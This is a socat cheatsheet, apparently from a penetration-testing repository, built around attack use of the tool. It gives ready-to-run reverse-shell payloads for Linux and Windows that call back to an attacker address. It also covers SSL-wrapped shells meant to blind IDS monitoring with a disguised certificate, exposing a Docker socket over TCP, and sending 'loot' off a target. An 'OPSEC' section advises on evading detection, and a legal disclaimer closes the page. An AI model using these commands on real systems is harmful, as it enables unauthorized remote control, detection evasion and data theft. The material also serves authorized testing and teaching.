# 🔄 Socat - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```

<p align="center">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protocols">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Establish two bidirectional byte streams and transfer data between files, pipes, devices, sockets, and SSL tunnels</b>
</p>

---

## 📋 Table of Contents

- [Overview & The Socat Architecture](#-overview--the-socat-architecture)
- [Socat vs Netcat Comparison](#-socat-vs-netcat-comparison)
- [Installation](#-installation)
- [Fully Interactive TTY Reverse Shells](#-fully-interactive-tty-reverse-shells)
  - [Attacker Listener (RAW TTY)](#attacker-listener-raw-tty)
  - [Target Payload (Pty Spawn)](#target-payload-pty-spawn)
  - [Windows Target Reverse Shell](#windows-target-reverse-shell)
- [Encrypted Reverse Shells via SSL/TLS](#-encrypted-reverse-shells-via-ssltls)
  - [Generating Certificates](#generating-certificates)
  - [Encrypted Listener & Connection](#encrypted-listener--connection)
- [Port Forwarding & Network Relays](#-port-forwarding--network-relays)
  - [Local Port Forwarding](#local-port-forwarding)
  - [Forking Listener (Multi-Client)](#forking-listener-multi-client)
  - [UNIX Domain Socket to TCP Relay (Docker Forwarding)](#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [File Transfers with Socat](#-file-transfers-with-socat)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & The Socat Architecture

**Socat** (SOcket CAT) is a command-line based utility that establishes two bidirectional byte streams and transfers data between them. Because the streams can be constructed from a huge set of address types (files, pipes, devices, TCP/UDP sockets, SSL, raw IP, SOCKS4, UNIX domain sockets), Socat is often described as Netcat on steroids.

In penetration testing and Red Teaming, Socat is legendary for two core superpowers:
1. **Instant Fully Interactive TTY Reverse Shells:** Spawning true pseudoterminals (`pty`) with job control, arrow keys, and auto-completion without needing Python or `stty raw -echo` gymnastics.
2. **Encrypted SSL/TLS Network Tunnels:** Bypassing standard IDS inspection by encrypting cleartext payloads over SSL.

---

## ⚖️ Socat vs Netcat Comparison

| Feature | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
|---------|---------------|-------------|-----------------|
| **Native PTY Shell Spawn** | ❌ No | ❌ No | ✅ Native (`pty,stderr,setsid`) |
| **SSL / TLS Encryption** | ❌ No | ✅ Yes (`--ssl`) | ✅ Native (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Forking Multi-Client Relay**| ❌ No | ❌ No | ✅ Native (`fork,reuseaddr`) |
| **UNIX Domain Sockets** | ❌ No | ✅ Limited | ✅ Native (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **Binary File Size** | Minimal (~40 KB) | Moderate (~500 KB) | Moderate (~400 KB standalone) |
| **Command Syntax** | Simple flags (`-lvnp`) | Flag-based (`-lvnp`) | Stream syntax (`<type>:<args>`) |

---

## 📥 Installation

```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```

---

## 💀 Fully Interactive TTY Reverse Shells

When you catch a reverse shell with standard Netcat, you receive an unstable dumb shell. Socat enables a 100% stable, fully interactive pseudo-terminal with Tab completion, Ctrl+C handling, and screen editor support (`vim`, `nano`).

### Attacker Listener (RAW TTY)

```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

> [!NOTE]
> `file:`tty`,raw,echo=0` puts your local terminal into raw mode and disables character echoing. If the connection closes unexpectedly and your terminal is unresponsive, type `reset` and press Enter.

### Target Payload (Pty Spawn)

```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

#### Breakdown of Options:
- `pty`: Allocates a pseudo-terminal on the target system.
- `stderr`: Redirects standard error into the socket.
- `setsid`: Runs the process in a new session group (prevents killing when parent exits).
- `sigint`: Passes interrupt signals (Ctrl+C) to the remote process instead of killing the session.
- `sane`: Resets terminal control settings to standard defaults.

### Windows Target Reverse Shell

```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```

---

## 🔐 Encrypted Reverse Shells via SSL/TLS

Prevent Network Security Monitoring (NSM), Zeek, and Snort from inspecting your reverse shell payload by encrypting the traffic with an ephemeral SSL/TLS certificate.

### Generating Certificates

```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```

### Encrypted Listener & Connection

```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

---

## 🔀 Port Forwarding & Network Relays

Socat can forward incoming traffic from one network interface or port directly to a different remote target.

### Local Port Forwarding

```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```

### Forking Listener (Multi-Client)

The `fork` option enables Socat to spawn a child process for every new inbound connection, keeping the main listener open:

```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```

### UNIX Domain Socket to TCP Relay (Docker Forwarding)

When accessing a local Docker daemon socket (`/var/run/docker.sock`) without root rights over the network:

```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```

---

## 📁 File Transfers with Socat

```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```

*(The `-u` flag specifies unidirectional mode from the first address to the second).*

---

## ⚡ Quick Reference Table

| Objective | Command |
|-----------|---------|
| **Interactive TTY Listener** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Interactive TTY Payload** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Encrypted SSL Listener** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Encrypted SSL Payload** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Port Forwarding (Relay)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **Expose UNIX Socket** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **File Transfer (Receiver)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **File Transfer (Sender)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ Defensive Considerations & OPSEC

1. **Traffic Encryption:** Cleartext TCP reverse shells expose commands to IDS/IPS. Always use `OPENSSL-LISTEN` and `OPENSSL` during red team engagements.
2. **Process Monitoring:** Sysmon / EDR platforms flag commands invoking `pty,stderr,setsid` as an immediate reverse shell heuristic.
3. **Standalone Binaries:** When deploying on target systems, use statically compiled standalone Socat binaries to avoid shared library dependencies.

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> This cheatsheet is for authorized penetration testing, security assessments, and academic research only. Unauthorized access to computer systems and network tampering is strictly illegal.